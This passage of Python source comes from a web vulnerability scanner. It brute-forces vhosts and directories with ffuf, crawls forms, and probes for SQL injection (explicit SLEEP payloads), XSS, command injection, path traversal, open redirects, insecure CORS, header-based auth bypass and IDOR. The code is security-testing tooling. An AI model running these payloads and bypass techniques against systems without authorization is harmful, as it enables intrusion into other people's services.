                            500: Fore.RED, 503: Fore.RED,
                        }
                        if not hits:
                            print(f"\n  {Fore.YELLOW}No subdomains found (everything filtered by baseline).{Style.RESET_ALL}\n")
                        else:
                            table_rows = []
                            for hit in sorted(hits, key=lambda x: (x.get('status', 0), x.get('input', {}).get('FUZZ', ''))):
                                sub = hit.get('input', {}).get('FUZZ', '')
                                status = hit.get('status', 0)
                                size = hit.get('length', 0)
                                words_h = hit.get('words', 0)
                                dur_ns = hit.get('duration', 0)
                                dur_ms = dur_ns // 1_000_000 if dur_ns else 0
                                fqdn = f"{sub}.{base_domain}"
                                color = STATUS_COLOR.get(status, Fore.WHITE)
                                table_rows.append([
                                    f"{color}[{status}]{Style.RESET_ALL}",
                                    fqdn,
                                    f"{size:,}",
                                    f"{words_h:,}",
                                    f"{dur_ms}ms",
                                ])
                                results.append({
                                    'subdomain': sub,
                                    'fqdn': fqdn,
                                    'status': status,
                                    'size': size,
                                })
                                FINDINGS.append(f"[VHOST] {fqdn} [{status}]")
                            print_table(
                                headers=["STATUS", "VHOST", "SIZE", "WORDS", "DUR"],
                                rows=table_rows,
                                alignments=['<', '<', '>', '>', '>'],
                                footer=f"  Total: {Fore.GREEN}{len(hits)}{Style.RESET_ALL} subdomain(s) found\n",
                            )
                    except Exception as e:
                        print_error(f"Error leyendo JSON de ffuf: {e}")
                if rc not in (0, 1):
                    print_error(f"ffuf exited with code {rc}")
            except KeyboardInterrupt:
                print_warning("Subdomain fuzzing interrupted by the user; waiting for ffuf to save partial results...")
                if process:
                    _wait_for_interrupted_child(process, "ffuf")
                try:
                    existing = {(item.get('fqdn'), item.get('status')) for item in results}
                    for hit in sorted(_load_ffuf_json_results(tmp_path), key=lambda x: (x.get('status', 0), x.get('input', {}).get('FUZZ', ''))):
                        sub = hit.get('input', {}).get('FUZZ', '')
                        status = hit.get('status', 0)
                        size = hit.get('length', 0)
                        fqdn = f"{sub}.{base_domain}"
                        key = (fqdn, status)
                        if key in existing:
                            continue
                        existing.add(key)
                        results.append({
                            'subdomain': sub,
                            'fqdn': fqdn,
                            'status': status,
                            'size': size,
                        })
                        FINDINGS.append(f"[VHOST] {fqdn} [{status}]")
                except Exception as e:
                    print_error(f"Error leyendo JSON parcial de ffuf: {e}")
                print_good(f"Saved {len(results)} vhosts found so far.")
                SCAN_DATA["vhosts"] = results
                return results
            except Exception as e:
                print_error(f"Error running ffuf: {e}")
            finally:
                try:
                    os.unlink(tmp_path)
                except Exception:
                    pass
            return results

        # Internal method (without ffuf)
        print_warning("ffuf unavailable, using internal method (slower).")
        try:
            with open(wordlist, 'r', encoding='utf-8', errors='ignore') as f:
                subs = [l.strip() for l in f if l.strip() and not l.startswith('#')]
        except Exception as e:
            print_error(f"Error leyendo wordlist: {e}")
            return results
        print_info(f"Testing {len(subs)} subdomains against {base_domain}...")

        def test_sub(sub):
            fqdn = f"{sub}.{base_domain}"
            try:
                r = session.get(target, headers={"Host": fqdn},
                                timeout=DEFAULT_TIMEOUT, allow_redirects=False)
                cl = r.headers.get('Content-Length')
                size = int(cl) if cl and cl.isdigit() else len(r.content)
                if baseline_size is not None and use_fs_filter and size == baseline_size:
                    return None
                return (sub, fqdn, r.status_code, size)
            except Exception:
                return None

        iterator = subs
        if HAS_TQDM:
            pbar = tqdm(total=len(subs), desc="VHost fuzzing", unit="req", ncols=80)
        try:
            with ThreadPoolExecutor(max_workers=threads) as ex:
                for res in ex.map(test_sub, iterator):
                    if HAS_TQDM:
                        pbar.update(1)
                    if res:
                        sub, fqdn, status, size = res
                        print_good(f"[{status}] {fqdn} (size={size})")
                        results.append({'subdomain': sub, 'fqdn': fqdn,
                                        'status': status, 'size': size})
                        FINDINGS.append(f"[VHOST] {fqdn} [{status}]")
        finally:
            if HAS_TQDM:
                pbar.close()
        return results
    except Exception as e:
        print_error(f"Error en vhost_bruteforce: {e}")
        return results


# A redirect is considered a "bounce to login" if the destination carries a parameter
# typical return (next/return/redirect...) or the path is an auth page.
_LOGIN_LOCATION_RE = re.compile(
    r'(?:[?&](?:next|return|returnurl|return_url|redirect|redirect_uri|continue|come_from|dest|destination)=)'
    r'|(?:/(?:account/)?(?:login|signin|sign[-_]?in|auth|sso|session/new)\b)',
    re.I,
)


def _is_login_location(loc):
    return bool(loc) and bool(_LOGIN_LOCATION_RE.search(loc))


def _resolve_authenticated_status(url, session, status, size):
    """En fuzzing autenticado, resolves 3xx hits by following the redirect with
    the session and returns (final_status, final_size, note).

    - If the redirect bounces to a login page (next= parameter or auth route,
      or the destination still shows a login form) the endpoint is
      protected: keep the 3xx and record it.
    - If it resolves to real content, return the final status (for example, 200) for
      avoid reporting a misleading 302 when the resource is in fact accessible when authenticated."""
    if status not in (301, 302, 303, 307, 308):
        return status, size, None
    try:
        nofollow = session.get(url, timeout=DEFAULT_TIMEOUT, allow_redirects=False)
    except requests.RequestException:
        return status, size, None
    if _is_login_location(nofollow.headers.get("Location", "") or ""):
        return status, size, "redirige a login (protegido)"
    try:
        final = session.get(url, timeout=DEFAULT_TIMEOUT, allow_redirects=True)
    except requests.RequestException:
        return status, size, None
    if _is_login_location(getattr(final, "url", "") or "") or _response_has_login_form(final):
        return status, size, "redirige a login (protegido)"
    return final.status_code, len(final.content), f"{status}→{final.status_code}"


def dir_bruteforce(target, session, wordlist=None, threads=THREADS, use_ffuf=True):
    try:
        if wordlist is None:
            default_wl = check_seclists()
            if default_wl:
                wordlist = default_wl
        if wordlist and not os.path.isfile(wordlist):
            print_warning(f"Could not read wordlist '{wordlist}'. Using internal list.")
            wordlist = None

        if use_ffuf and check_ffuf() and wordlist and os.path.isfile(wordlist):
            # Temporary file for clean JSON results (without calibration noise)
            tmp_fd, tmp_path = tempfile.mkstemp(suffix='.json')
            os.close(tmp_fd)

            # Pre-filter wordlist: discard comments (#), blank lines, and
            # entries with spaces/invalid characters for web paths.
            clean_fd, clean_wl = tempfile.mkstemp(suffix='.txt', prefix='wstg_wl_')
            os.close(clean_fd)
            kept = 0
            try:
                with open(wordlist, 'r', encoding='utf-8', errors='ignore') as src, \
                     open(clean_wl, 'w', encoding='utf-8') as dst:
                    for line in src:
                        entry = line.strip()
                        if not entry or entry.startswith('#'):
                            continue
                        # A web path should not contain internal whitespace
                        if any(ch.isspace() for ch in entry):
                            continue
                        dst.write(entry + '\n')
                        kept += 1
                print_info(f"Clean wordlist: {kept} valid entries (discarded comments and invalid lines)")
            except Exception as e:
                print_warning(f"Could not clean the wordlist ({e}); the original will be used.")
                clean_wl = wordlist

            # Calculate root baseline size to filter wildcard pages
            baseline_size = None
            try:
                base_resp = session.get(target, timeout=DEFAULT_TIMEOUT)
                if base_resp.status_code == 200:
                    baseline_size = len(base_resp.content)
            except Exception:
                pass

            ffuf_cmd = [
                "ffuf", "-u", f"{target}/FUZZ", "-w", clean_wl,
                "-t", str(threads), "-fc", "404,403", "-ac",
                "-o", tmp_path, "-of", "json",
            ]
            ffuf_cmd = _append_ffuf_session_headers(ffuf_cmd, session)
            if baseline_size:
                # Filter responses with the exact same size as the root page
                ffuf_cmd += ["-fs", str(baseline_size)]
            print_info(f"Running: {' '.join(ffuf_cmd[:7])}")
            print()  # blank line before the native ffuf progress bar

            results = []
            process = None
            try:
                # No piping: ffuf escribe directamente al terminal → su barra de
                # progress works correctly (needs a TTY to update).
                process = subprocess.Popen(ffuf_cmd)
                process.wait()
                rc = process.returncode
                print()  # blank line after the ffuf progress bar

                # ── Read clean results from the JSON ─────────────────────
                if os.path.isfile(tmp_path) and os.path.getsize(tmp_path) > 2:
                    try:
                        hits = _load_ffuf_json_results(tmp_path)

                        STATUS_COLOR = {
                            200: Fore.GREEN,  201: Fore.GREEN,  204: Fore.GREEN,
                            301: Fore.CYAN,   302: Fore.CYAN,   307: Fore.CYAN,   308: Fore.CYAN,
                            401: Fore.YELLOW, 403: Fore.YELLOW,
                            500: Fore.RED,    503: Fore.RED,
                        }

                        if not hits:
                            print(f"\n  {Fore.YELLOW}No results (all filtered by auto-calibration){Style.RESET_ALL}\n")
                        else:
                            if AUTHENTICATED:
                                print_info("Authenticated session: resolving redirects for 3xx hits...")
                            table_rows = []
                            for hit in sorted(hits, key=lambda x: (x.get('status', 0), x.get('input', {}).get('FUZZ', ''))):
                                path    = hit.get('input', {}).get('FUZZ', '') or hit.get('url', '')
                                status  = hit.get('status', 0)
                                size    = hit.get('length', 0)
                                words_h = hit.get('words', 0)
                                dur_ns  = hit.get('duration', 0)
                                dur_ms  = dur_ns // 1_000_000 if dur_ns else 0
                                url_hit = hit.get('url', urljoin(target, path))
                                note    = None
                                # With an authenticated session, a 302 can hide a real 200:
                                # follow the redirect and report the final status.
                                if AUTHENTICATED:
                                    status, size, note = _resolve_authenticated_status(
                                        url_hit, session, status, size)
                                color   = STATUS_COLOR.get(status, Fore.WHITE)
                                table_rows.append([
                                    f"{color}[{status}]{Style.RESET_ALL}",
                                    path,
                                    f"{size:,}",
                                    f"{words_h:,}",
                                    f"{dur_ms}ms",
                                    note or "",
                                ])
                                results.append({'url': url_hit, 'status': status, 'size': size, 'note': note})
                                FINDINGS.append(f"[DIR] {url_hit} [{status}]" + (f" ({note})" if note else ""))
                            print_table(
                                headers=["STATUS", "PATH", "SIZE", "WORDS", "DUR", "NOTA"],
                                rows=table_rows,
                                alignments=['<', '<', '>', '>', '>', '<'],
                                footer=f"  Total: {Fore.GREEN}{len(hits)}{Style.RESET_ALL} endpoint(s) found\n",
                            )
                    except Exception as e:
                        print_error(f"Error leyendo JSON de ffuf: {e}")

                if rc not in (0, 1):
                    print_error(f"ffuf exited with code {rc}")

            except KeyboardInterrupt:
                print_warning("Fuzzing interrupted by the user; waiting for ffuf to save partial results...")
                if process:
                    _wait_for_interrupted_child(process, "ffuf")
                try:
                    existing = {(item.get('url'), item.get('status')) for item in results}
                    for hit in sorted(_load_ffuf_json_results(tmp_path), key=lambda x: (x.get('status', 0), x.get('input', {}).get('FUZZ', ''))):
                        path = hit.get('input', {}).get('FUZZ', '') or hit.get('url', '')
                        status = hit.get('status', 0)
                        size = hit.get('length', 0)
                        url_hit = hit.get('url', urljoin(target, path))
                        key = (url_hit, status)
                        if key in existing:
                            continue
                        existing.add(key)
                        results.append({'url': url_hit, 'status': status, 'size': size})
                        FINDINGS.append(f"[DIR] {url_hit} [{status}]")
                except Exception as e:
                    print_error(f"Error leyendo JSON parcial de ffuf: {e}")
                # Save partial results in SCAN_DATA (mutation, no global needed)
                SCAN_DATA["directory_hits"] = results
                print_good(f"Saved {len(results)} directories found so far.")
                return results
            except Exception as e:
                print_error(f"Error running ffuf: {e}")
                print_warning("Falling back to internal method...")
            finally:
                try:
                    os.unlink(tmp_path)
                except Exception:
                    pass
                # Delete temporary cleaned wordlist (only if it was created)
                if clean_wl and clean_wl != wordlist:
                    try:
                        os.unlink(clean_wl)
                    except Exception:
                        pass

            return results
        else:
            if use_ffuf and not check_ffuf():
                print_warning("ffuf is not installed. Using internal method (slower).")
            if wordlist is None:
                paths = COMMON_DIRS
                print_info(f"Using reduced internal list ({len(paths)} paths)")
            else:
                with open(wordlist, 'r') as f:
                    paths = [line.strip() for line in f if line.strip() and not line.startswith('#')]
                print_info(f"Using wordlist: {wordlist} ({len(paths)} entradas)")
            
            results = []
            print_info(f"Starting directory fuzzing (internal method)...")

            def test_path(path):
                url = urljoin(target, path)
                try:
                    resp = session.get(url, timeout=DEFAULT_TIMEOUT, allow_redirects=False)
                    if resp.status_code < 400:
                        status, size, note = resp.status_code, len(resp.content), None
                        if AUTHENTICATED:
                            status, size, note = _resolve_authenticated_status(
                                url, session, status, size)
                        return (url, status, size, note)
                except Exception:
                    pass
                return None

            if HAS_TQDM:
                with tqdm(total=len(paths), desc="Fuzzing directories", unit="req", ncols=80) as pbar:
                    with ThreadPoolExecutor(max_workers=threads) as executor:
                        future_to_path = {executor.submit(test_path, p): p for p in paths}
                        for future in as_completed(future_to_path):
                            res = future.result()
                            if res:
                                url, code, size, note = res
                                print_good(f"Found: {url} (status {code}, size {size})"
                                           + (f" [{note}]" if note else ""))
                                results.append({'url': url, 'status': code, 'size': size, 'note': note})
                            pbar.update(1)
            else:
                completed = 0
                with ThreadPoolExecutor(max_workers=threads) as executor:
                    future_to_path = {executor.submit(test_path, p): p for p in paths}
                    for future in as_completed(future_to_path):
                        completed += 1
                        if completed % 50 == 0 or completed == len(paths):
                            print_info(f"Progress: {completed}/{len(paths)} paths tested")
                        res = future.result()
                        if res:
                            url, code, size, note = res
                            print_good(f"Found: {url} (status {code}, size {size})"
                                       + (f" [{note}]" if note else ""))
                            results.append({'url': url, 'status': code, 'size': size, 'note': note})
            return results
    except Exception as e:
        print_error(f"Error en fuzzing: {e}")
        return []

def extract_forms_and_params(target, session):
    def _extract_from_single_page(page_url):
        forms = []
        params = set()
        try:
            resp = session.get(page_url, timeout=DEFAULT_TIMEOUT)
            if resp.status_code >= 400:
                return forms, params
            content_type = (resp.headers.get('Content-Type', '') or '').lower()
            if 'html' not in content_type and '<form' not in resp.text.lower():
                return forms, params

            if HAS_BS4:
                soup = BeautifulSoup(resp.text, 'html.parser')
                for form in soup.find_all('form'):
                    action = form.get('action')
                    method = form.get('method', 'get').upper()
                    inputs = []
                    for inp in form.find_all(['input', 'textarea', 'select']):
                        name = inp.get('name')
                        if not name:
                            continue
                        input_type = (inp.get('type') or '').lower()
                        if input_type in ('submit', 'button', 'image', 'reset', 'file'):
                            continue
                        inputs.append(name)
                    if inputs:
                        forms.append({
                            'page_url': page_url,
                            'action': action,
                            'method': method,
                            'inputs': sorted(set(inputs))
                        })

                for a in soup.find_all('a', href=True):
                    href = a['href']
                    parsed = urlparse(href)
                    if parsed.query:
                        for key in parse_qs(parsed.query).keys():
                            params.add(key)
            else:
                form_regex = re.compile(r'<form.*?action=["\'](.*?)["\'].*?method=["\'](.*?)["\'].*?>', re.I)
                for match in form_regex.finditer(resp.text):
                    action = match.group(1)
                    method = match.group(2).upper()
                    forms.append({'page_url': page_url, 'action': action, 'method': method, 'inputs': []})
                param_regex = re.compile(r'<a\s+href=["\'][^"\']*\?(.*?)(?:["\']|#)', re.I)
                for match in param_regex.finditer(resp.text):
                    query = match.group(1)
                    for key in parse_qs(query).keys():
                        params.add(key)

            parsed_page = urlparse(page_url)
            if parsed_page.query:
                for key in parse_qs(parsed_page.query).keys():
                    params.add(key)
        except Exception:
            pass
        return forms, params

    try:
        forms = []
        params = set()
        form_keys = set()

        print_info("Crawling to detect forms and inputs thoroughly...")
        discovered_urls, spider_params, spider_forms = spider_website(
            target,
            session,
            max_pages=250,
            max_depth=3,
            use_robots=True,
        )

        params.update(spider_params or set())

        # Reuse the form inputs already detected by the spider (with inputs)
        for f in spider_forms or []:
            action_url = f.get('action') or f.get('url') or f.get('page_url') or target
            method = (f.get('method') or 'GET').upper()
            inputs = sorted(set(f.get('inputs', [])))
            if not inputs:
                continue
            key = (action_url, method, tuple(inputs))
            if key in form_keys:
                continue
            form_keys.add(key)
            forms.append({
                'page_url': f.get('page_url', action_url),
                'action': action_url,
                'method': method,
                'inputs': inputs,
            })

        print_info(f"Forms found: {len(forms)}")
        print_info(f"Unique parameters en enlaces: {len(params)}")
        return forms, list(params)
    except Exception as e:
        print_error(f"Error extracting forms/parameters: {e}")
        return [], []

def advanced_injection_tests(url, param, session, method='GET'):
    try:
        # SQLi
        for payload in ['\' OR SLEEP(5)-- ', '1\' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--']:
            try:
                start = time.time()
                if method == 'GET':
                    test_url = f"{url}?{param}={payload}"
                    session.get(test_url, timeout=DEFAULT_TIMEOUT+2)
                else:
                    session.post(url, data={param: payload}, timeout=DEFAULT_TIMEOUT+2)
                elapsed = time.time() - start
                if elapsed > 4:
                    print_vuln(f"Possible time-based SQLi on {param} (delay {elapsed:.2f}s)")
                    return True
            except KeyboardInterrupt:
                print_warning("Injection test interrupted by the user.")
                return False
            except:
                pass
        # XSS
        for payload in XSS_PAYLOADS:
            try:
                if method == 'GET':
                    test_url = f"{url}?{param}={payload}"
                    resp = session.get(test_url, timeout=DEFAULT_TIMEOUT)
                else:
                    resp = session.post(url, data={param: payload}, timeout=DEFAULT_TIMEOUT)
                if payload in resp.text and ('<script>' in payload or 'onerror=' in payload):
                    print_vuln(f"Possible XSS on {param} with payload: {payload}")
                    return True
            except KeyboardInterrupt:
                print_warning("Injection test interrupted by the user.")
                return False
            except:
                pass
        # Command Injection
        for payload in COMMAND_INJECT:
            try:
                if method == 'GET':
                    test_url = f"{url}?{param}={payload}"
                    resp = session.get(test_url, timeout=DEFAULT_TIMEOUT)
                else:
                    resp = session.post(url, data={param: payload}, timeout=DEFAULT_TIMEOUT)
                if "uid=" in resp.text or "Directory of" in resp.text:
                    print_vuln(f"Possible Command Injection on {param} with payload: {payload}")
                    return True
            except KeyboardInterrupt:
                print_warning("Injection test interrupted by the user.")
                return False
            except:
                pass
        return False
    except Exception as e:
        print_error(f"Error in advanced_injection_tests for {param}: {e}")
        return False

def test_path_traversal(url, param, session, method='GET'):
    try:
        for payload in PATH_TRAVERSAL:
            try:
                if method == 'GET':
                    test_url = f"{url}?{param}={payload}"
                    resp = session.get(test_url, timeout=DEFAULT_TIMEOUT)
                else:
                    resp = session.post(url, data={param: payload}, timeout=DEFAULT_TIMEOUT)
                if "root:" in resp.text or "[extensions]" in resp.text:
                    print_vuln(f"Path Traversal en {param}: {payload}")
                    return True
            except KeyboardInterrupt:
                print_warning("Path Traversal test interrupted by the user.")
                return False
            except:
                pass
        return False
    except Exception as e:
        print_error(f"Error en path traversal: {e}")
        return False

def test_open_redirect(url, param, session, method='GET'):
    try:
        for payload in OPEN_REDIRECT:
            try:
                if method == 'GET':
                    test_url = f"{url}?{param}={payload}"
                    resp = session.get(test_url, timeout=DEFAULT_TIMEOUT, allow_redirects=False)
                else:
                    resp = session.post(url, data={param: payload}, timeout=DEFAULT_TIMEOUT, allow_redirects=False)
                if resp.status_code in [301,302,303,307]:
                    location = resp.headers.get('Location', '')
                    if 'evil.com' in location or '//' in location:
                        print_vuln(f"Open Redirect en {param} -> {location}")
                        return True
            except KeyboardInterrupt:
                print_warning("Open Redirect test interrupted by the user.")
                return False
            except:
                pass
        return False
    except Exception as e:
        print_error(f"Error en open redirect: {e}")
        return False

def check_security_headers(headers):
    try:
        checks = {
            'Strict-Transport-Security': 'HSTS no implementado',
            'Content-Security-Policy': 'CSP no implementado',
            'X-Frame-Options': 'Clickjacking: falta X-Frame-Options',
            'X-Content-Type-Options': 'Falta X-Content-Type-Options',
            'Referrer-Policy': 'Falta Referrer-Policy'
        }
        for header, warning in checks.items():
            if header not in headers:
                print_warning(warning)
            else:
                print_good(f"{header}: {headers[header]}")
    except Exception as e:
        print_error(f"Error checking headers: {e}")

def check_cookie_security(cookies):
    try:
        for cookie in cookies:
            name = cookie.name
            if not cookie.secure:
                print_warning(f"Cookie '{name}' without Secure flag")
            if not cookie.has_nonstandard_attr('HttpOnly'):
                print_warning(f"Cookie '{name}' without HttpOnly flag")
    except Exception as e:
        print_error(f"Error revisando cookies: {e}")

def check_info_disclosure(resp_text):
    try:
        emails = re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', resp_text)
        if emails:
            print_warning(f"Emails exposeds: {', '.join(set(emails))}")
        internal_paths = re.findall(r'(?:C:\\|/home/|/var/www/|/etc/)[^\s\'"<>]+', resp_text, re.I)
        if internal_paths:
            print_warning(f"Paths internas expuestas: {set(internal_paths)}")
        comments = re.findall(r'<!--(.*?)-->', resp_text, re.DOTALL)
        suspicious = [c for c in comments if re.search(r'todo|fixme|debug|password|key|token', c, re.I)]
        if suspicious:
            print_warning("Information sensible en comentarios HTML")
    except Exception as e:
        print_error(f"Error en info disclosure: {e}")

def check_directory_listing(url, session):
    try:
        test_url = urljoin(url, 'images/')
        resp = session.get(test_url, timeout=DEFAULT_TIMEOUT)
        if resp.status_code == 200 and ('Index of /' in resp.text or 'Parent Directory' in resp.text):
            print_vuln(f"Directory listing en {test_url}")
    except:
        pass

def check_ssl_tls(target):
    try:
        parsed = urlparse(target)
        if parsed.scheme != 'https':
            print_info("SSL/TLS will not be evaluated (not HTTPS)")
            return
        hostname = parsed.hostname
        port = parsed.port or 443
        context = ssl.create_default_context()
        with socket.create_connection((hostname, port), timeout=DEFAULT_TIMEOUT) as sock:
            with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                cert = ssock.getpeercert()
                print_info(f"Certificate for: {cert.get('subject')}")
                version = ssock.version()
                if version and version not in ('TLSv1.2', 'TLSv1.3'):
                    print_warning(f"Insecure TLS protocol: {version}")
                else:
                    print_good(f"TLS protocol: {version}")
    except Exception as e:
        print_error(f"SSL/TLS error: {e}")

def test_cors_advanced(target, session):
    """OWASP API8 / WSTG-CLNT-007: Verifica configuraciones CORS inseguras."""
    try:
        parsed = urlparse(target)
        evil_origins = [
            "https://evil.com",
            "null",
            f"https://{parsed.netloc}.evil.com",
            f"https://evil.{parsed.netloc}",
        ]
        for origin in evil_origins:
            try:
                resp = session.get(target, timeout=DEFAULT_TIMEOUT, headers={'Origin': origin})
                acao = resp.headers.get('Access-Control-Allow-Origin', '')
                acac = resp.headers.get('Access-Control-Allow-Credentials', '').lower()
                if acao == '*' and acac == 'true':
                    print_vuln(f"Critical CORS: wildcard + Allow-Credentials=true [{origin}]")
                elif acao == origin:
                    if acac == 'true':
                        print_vuln(f"CORS: reflected origin with credentials allowed -> {origin}")
                    else:
                        print_warning(f"CORS: reflected origin without credentials -> {origin}")
                elif acao == '*':
                    print_warning("CORS: wildcard (*) without Allow-Credentials")
                # Verificar preflight OPTIONS
                try:
                    pre = session.options(target, timeout=DEFAULT_TIMEOUT, headers={
                        'Origin': origin,
                        'Access-Control-Request-Method': 'POST',
                        'Access-Control-Request-Headers': 'Authorization',
                    })
                    pre_acao = pre.headers.get('Access-Control-Allow-Origin', '')
                    if pre_acao == origin or pre_acao == '*':
                        print_info(f"  Preflight CORS acepta POST+Authorization desde {origin}")
                except Exception:
                    pass
            except Exception:
                pass
    except Exception as e:
        print_error(f"Error en test CORS avanzado: {e}")


# ========== API PENTESTING (OWASP API Top 10) ==========

def discover_api_endpoints(target, session):
    """OWASP API9: discover exposed endpoints and analyze OpenAPI/Swagger documentation.
    Also performs recursive fuzzing under prefixes such as /api/v1, /api/v2, /v1, etc."""
    found = []
    seen_urls = set()

    # Codes that indicate "the endpoint exists" (not 404)
    INTERESTING = {200, 201, 202, 204, 301, 302, 307, 308, 401, 403, 405, 500}

    def _probe(endpoint, depth_label=""):
        """Tests an endpoint with GET. Returns dict if interesting, None otherwise."""
        url = urljoin(target, endpoint)
        if url in seen_urls:
            return None
        seen_urls.add(url)
        try:
            resp = session.get(url, timeout=DEFAULT_TIMEOUT, allow_redirects=False)
        except Exception:
            return None
        st = resp.status_code
        if st not in INTERESTING:
            return None
        ct = resp.headers.get('Content-Type', '').split(';')[0].strip()
        item = {'url': url, 'endpoint': endpoint, 'status': st, 'content_type': ct}

        prefix = f"  {depth_label}" if depth_label else ""
        if st in (200, 201, 202, 204):
            print_good(f"{prefix}[{st}] {url}  ({ct})")
        elif st in (301, 302, 307, 308):
            loc = resp.headers.get('Location', '')
            print_info(f"{prefix}[{st}] {url} -> {loc}")
        elif st == 401:
            print_warning(f"{prefix}[401] {url}  (requires authentication)")
        elif st == 403:
            print_warning(f"{prefix}[403] {url}  (prohibido)")
        elif st == 405:
            allow = resp.headers.get('Allow', '')
            print_warning(f"{prefix}[405] {url}  (method not allowed; Allow: {allow or 'N/A'})")
        elif st == 500:
            print_error(f"{prefix}[500] {url}  (internal error - possible unhandled parameter)")

        # If it is Swagger/OpenAPI/API docs, parse and register routes
        if st == 200 and any(x in endpoint for x in ('swagger', 'openapi', 'api-docs')):
            try:
                doc = resp.json()
                paths = list(doc.get('paths', {}).keys())
                if paths:
                    print_info(f"  Paths documentadas ({len(paths)}): {', '.join(paths[:12])}")
                    FINDINGS.append({
                        "name": "Documentacion OpenAPI/Swagger expuesta",
                        "detail": f"{url} exposes {len(paths)} API paths (OWASP API9).",
                        "severity": "medium",
                    })
                    for path in paths:
                        extra_url = urljoin(target, path)
                        if extra_url not in seen_urls:
                            seen_urls.add(extra_url)
                            found.append({'url': extra_url, 'endpoint': path,
                                          'status': 0, 'content_type': ''})
            except Exception:
                pass
        return item

    try:
        print_info(f"Scanning {len(API_ENDPOINTS)} known API paths...")
        for ep in API_ENDPOINTS:
            item = _probe(ep)
            if item:
                found.append(item)

        # Recursive fuzzing under typical API prefixes. Always done
        # (not only when the prefix root responds) because many apps return
        # 404 on /api/v1 but still expose /api/v1/users, /api/v1/login, etc.
        prefixes_to_fuzz = list(API_BASE_PREFIXES)

        # Derive additional prefixes from endpoints already found or
        # documented (for example, /api/users -> add /api and /api/v1)
        for item in list(found):
            ep = item.get('endpoint', '')
            if not ep or not ep.startswith('/'):
                continue
            parts = [p for p in ep.split('/') if p]
            for i in range(1, len(parts)):
                candidate = '/' + '/'.join(parts[:i])
                if candidate not in prefixes_to_fuzz:
                    prefixes_to_fuzz.append(candidate)

        # Deduplicar manteniendo orden
        seen_pref = set()
        prefixes_to_fuzz = [p for p in prefixes_to_fuzz if not (p in seen_pref or seen_pref.add(p))]

        print_info(
            f"Fuzzing recursivo: {len(API_REOSURCES)} assets × "
            f"{len(prefixes_to_fuzz)} prefijos ({', '.join(prefixes_to_fuzz[:8])}"
            f"{', ...' if len(prefixes_to_fuzz) > 8 else ''})"
        )
        # Lista deduplicada de endpoints a fuzzear (prefijo x recurso)
        fuzz_endpoints = []
        seen_fuzz = set()
        for prefix in prefixes_to_fuzz:
            for resource in API_REOSURCES:
                endpoint = f"{prefix.rstrip('/')}/{resource}"
                if endpoint in seen_fuzz:
                    continue
                seen_fuzz.add(endpoint)
                fuzz_endpoints.append(endpoint)
        # Tested in parallel: each endpoint is unique and _probe is safe under the GIL
        # for this load (atomic set.add/list.append; the Swagger branch doesn't apply to assets).
        with ThreadPoolExecutor(max_workers=max(THREADS, 8)) as ex:
            futures = [ex.submit(_probe, ep, "↳ ") for ep in fuzz_endpoints]
            for fut in as_completed(futures):
                try:
                    item = fut.result()
                except Exception:
                    item = None
                if item:
                    found.append(item)

        print_info(f"Total API endpoints found/accessible: {len(found)}")
        if found:
            STATUS_COLOR = {
                200: Fore.GREEN, 201: Fore.GREEN, 202: Fore.GREEN, 204: Fore.GREEN,
                301: Fore.CYAN, 302: Fore.CYAN, 307: Fore.CYAN, 308: Fore.CYAN,
                401: Fore.YELLOW, 403: Fore.YELLOW, 405: Fore.YELLOW,
                500: Fore.RED, 503: Fore.RED,
            }
            rows = []
            for item in sorted(found, key=lambda x: (x.get('status', 0), x.get('endpoint', ''))):
                st = item.get('status', 0)
                color = STATUS_COLOR.get(st, Fore.WHITE)
                rows.append([
                    f"{color}[{st}]{Style.RESET_ALL}",
                    item.get('endpoint', ''),
                    item.get('url', ''),
                    item.get('content_type', '') or '-',
                ])
            print_table(
                headers=["STATUS", "ENDPOINT", "URL", "CONTENT-TYPE"],
                rows=rows,
                alignments=['<', '<', '<', '<'],
                title="Discovered API Endpoints:",
            )
    except Exception as e:
        print_error(f"Error descubriendo endpoints: {e}")
    return found


def test_api_auth_bypass(found_endpoints, session):
    """OWASP API5/BFLA: detect restricted endpoints accessible without authentication."""
    try:
        unauth_session = get_session()
        restricted = [item for item in found_endpoints if item['status'] in (401, 403)]
        if not restricted:
            print_info("No restricted endpoints found to test bypass.")
            return

        def _looks_like_real_content(resp):
            # Avoids false positives: a 200 with a generic login/SPA page is not a bypass.
            if resp.status_code != 200 or len(resp.content) <= 50:
                return False
            if _response_has_login_form(resp):
                return False
            return True

        for item in restricted:
            url = item['url']
            path = urlparse(url).path or '/'
            # Headers whose value should point to the PATH of the restricted endpoint itself
            bypass_headers_list = [
                {'X-Original-URL': path},
                {'X-Rewrite-URL': path},
                {'X-Custom-IP-Authorization': '127.0.0.1'},
                {'X-Forwarded-For': '127.0.0.1'},
                {'X-Remote-IP': '127.0.0.1'},
                {'X-Client-IP': '127.0.0.1'},
            ]
            try:
                resp = unauth_session.get(url, timeout=DEFAULT_TIMEOUT)
                if _looks_like_real_content(resp):
                    print_vuln(f"BFLA: accessible without auth -> {url}")
                    FINDINGS.append({
                        "name": "BFLA / restricted endpoint without auth",
                        "detail": f"{url} returns 200 with content without authentication (OWASP API5).",
                        "severity": "high",
                    })
                    continue
            except Exception:
                pass
            for hdrs in bypass_headers_list:
                try:
                    resp = unauth_session.get(url, timeout=DEFAULT_TIMEOUT, headers=hdrs)
                    if _looks_like_real_content(resp):
                        hdr_name = list(hdrs.keys())[0]
                        print_vuln(f"Auth bypass with {hdr_name} on {url}")
                        FINDINGS.append({
                            "name": "Auth bypass via header",
                            "detail": f"{url} accessible with {hdr_name}: {list(hdrs.values())[0]} (OWASP API5).",
                            "severity": "high",
                        })
                        break
                except Exception:
                    pass
    except Exception as e:
        print_error(f"Error en test auth bypass: {e}")


def test_api_idor(found_endpoints, session):
    """OWASP API1/BOLA: test IDOR by modifying IDs in routes and query parameters."""
    try:
        # (pattern, id group, nonexistent_id_for_control_probe)
        id_patterns = [
            (r'((?:/[a-zA-Z_-]+)/)(\d{1,10})(/|$)', 2, '999999999999'),
            (r'([?&](?:id|user_id|uid|account_id|object_id)=)(\d+)', 2, '999999999999'),
            (r'((?:/[a-zA-Z_-]+)/)([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})', 2,
             '00000000-0000-0000-0000-000000000000'),
        ]
        alt_ids = ['1', '2', '0', '3', '99999']
        tested = set()
        hits = 0

        def _ratio(a, b):
            m = max(a, b)
